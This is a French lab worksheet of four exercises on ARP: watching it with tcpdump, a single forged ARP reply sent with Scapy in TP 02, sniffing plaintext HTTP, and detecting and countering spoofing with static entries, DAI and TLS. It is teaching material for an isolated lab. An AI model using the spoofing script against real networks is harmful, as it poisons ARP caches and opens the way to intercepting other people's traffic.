Laboratoire ARP : quatre TP progressifs

D'abord comprendre qui possède une adresse IPv4 ; ensuite tester ce qui se passe quand un équipement ment ; enfin observer les effets et construire des protections.

Règle impérative : n'utilise ces manipulations que sur tes propres équipements, dans un switch de laboratoire physiquement isolé du réseau scolaire, du réseau familial et d'Internet. TP 01 · 45 MIN · OBSERVATION

Observer ARP avec tcpdump

Problème : Alice connaît l'adresse IP de Bob, mais pas son adresse MAC. Comment peut-elle lui transmettre une trame ?

Hypothèse

La machine interroge le lien local. Une réponse lui permet de mémoriser temporairement l'association IPv4–MAC.

Manipulation

Sur le Victus, capturer ARP. Depuis Alice, effacer l'entrée Bob puis la solliciter.

# Victus : voir les requêtes broadcast
sudo tcpdump -n -e -i eth0 arp

# Alice : supprimer puis reconstruire l'entrée
sudo ip neigh del 10.77.0.20 dev eth0 2>/dev/null || true
ping -c 2 10.77.0.20
ip neigh show 10.77.0.20

La réponse unicast peut ne pas être visible sur le port du Victus sans port miroir ; effectuer la capture sur Alice pour voir les deux sens.

À relever

  • MAC de diffusion de la requête ;
  • IPv4 demandée et MAC annoncée dans la réponse ;
  • contenu du cache avant et après le ping.
Correction raisonnée

ARP traduit une IPv4 locale connue en adresse de liaison. La demande est broadcast parce que la MAC recherchée est inconnue. Pour une destination distante, Alice chercherait généralement la MAC de son prochain saut, et non celle du serveur distant.

TP 02 · 45 MIN · USURPATION CONTRÔLÉE

Pourquoi peut-on mentir avec ARP ?

Problème : ARP authentifie-t-il réellement la correspondance entre une IPv4 et une adresse MAC ?

État initial

# Alice
ping -c 1 10.77.0.20
ip neigh show 10.77.0.20
# Sur Pi B et Victus : relever leur vraie MAC
cat /sys/class/net/eth0/address

Expérience

Le Victus diffuse une seule annonce ARP indiquant mensongèrement que l'IPv4 de Bob correspond à la MAC du Victus. Prévoir Scapy sur le Victus.

sudo python3 - <<'PY'
from scapy.all import ARP, Ether, sendp, get_if_hwaddr
iface = "eth0"
mac = get_if_hwaddr(iface)
frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2, psrc="10.77.0.20", hwsrc=mac,
    pdst="10.77.0.10", hwdst="ff:ff:ff:ff:ff:ff")
sendp(frame, iface=iface, count=1, verbose=False)
PY
# Sur Alice
ip neigh show 10.77.0.20

Si la MAC change, le cache a accepté l'annonce mensongère. Si elle ne change pas, comparer la capture à la politique d'apprentissage de l'OS. Ce test n'active ni relais de paquets ni interception cachée.

Nettoyer et vérifier

sudo ip neigh del 10.77.0.20 dev eth0 2>/dev/null || true
ping -c 1 10.77.0.20
ip neigh show 10.77.0.20
Correction raisonnée

ARP ne fournit pas de preuve cryptographique d'identité. Une fausse annonce peut empoisonner le cache selon le système et son état. Cela ne suffit pas à établir un MITM : faire transiter correctement le trafic à travers l'attaquant exige d'autres conditions.

TP 03 · 45 MIN · CONFIDENTIALITÉ

Observer HTTP, comprendre HTTPS

Problème : voir passer des trames revient-il à lire les échanges ?

On utilise volontairement un serveur HTTP de laboratoire, sans interception furtive. Sur Pi B :

mkdir -p ~/arp-http
printf 'Bonjour du laboratoire ARP\n' > ~/arp-http/index.html
cd ~/arp-http
python3 -m http.server 8080 --bind 10.77.0.20

Capturer côté Pi B et, depuis Alice, récupérer le texte.

# Pi B, second terminal
sudo tcpdump -A -s 0 -i eth0 'tcp port 8080'
# Alice
curl http://10.77.0.20:8080/

Repérer la requête GET et la réponse lisible. Comparer ensuite, dans un environnement TLS local configuré pour les tests ou lors d'une observation HTTPS légitime hors du LAN isolé, les métadonnées visibles et le corps HTTP chiffré.

Correction raisonnée

HTTP non chiffré peut exposer requêtes et réponses. HTTPS (TLS correctement validé) protège le contenu applicatif contre un observateur réseau. ARP Spoofing n'annule pas à lui seul les protections TLS ; ne jamais ignorer une alerte de certificat.

TP 04 · 45 MIN · DÉFENSE

Détecter et limiter une usurpation ARP

Problème : comment repérer et limiter le remplacement injustifié d'une association IPv4–MAC ?

Observer les changements

ip neigh show 10.77.0.20 dev eth0 | tee /tmp/arp-reference.txt
watch -n 1 'ip neigh show 10.77.0.20 dev eth0'
# Autre terminal
sudo tcpdump -n -e -i eth0 arp

Comparer l'état avant et après le TP 2. Un changement de MAC n'est pas à lui seul une preuve d'attaque : il peut exister des changements matériels ou des systèmes de haute disponibilité.

Tester une entrée statique

Sur Alice, substituer à l'exemple ci-dessous la vraie MAC de Pi B.

sudo ip neigh replace 10.77.0.20 lladdr XX:XX:XX:XX:XX:XX \
  nud permanent dev eth0
ip neigh show 10.77.0.20 dev eth0

Répéter le paquet du TP 2 et examiner le cache. L'entrée statique est pertinente pour un petit test, mais coûteuse à maintenir et susceptible de provoquer une panne si la MAC est incorrecte.

Comparer les protections

Dynamic ARP Inspection (DAI) sur un switch compatible valide les annonces ARP sur les ports non fiables, généralement avec des liaisons IP–MAC issues du DHCP Snooping. Les VLAN limitent le périmètre mais ne protègent pas deux hôtes du même VLAN. TLS protège les données applicatives.

Rétablir l'état normal

sudo ip neigh del 10.77.0.20 dev eth0
ping -c 1 10.77.0.20
ip neigh show 10.77.0.20
Correction raisonnée

Surveillance = détecter ; entrée permanente = figer une association sur un hôte ; DAI = filtrer des réponses ARP au niveau du switch ; TLS = préserver la confidentialité et l'authenticité applicative. Aucune de ces mesures ne remplace entièrement les autres.

À retenir : ARP répond au besoin de livrer une trame sur un lien IPv4 local. Sa faiblesse vient de l'absence d'authentification native des annonces. Usurpation, détournement et interception ne sont pas synonymes. Le laboratoire sépare l'observation du protocole, l'injection de test, la protection des données et les défenses.
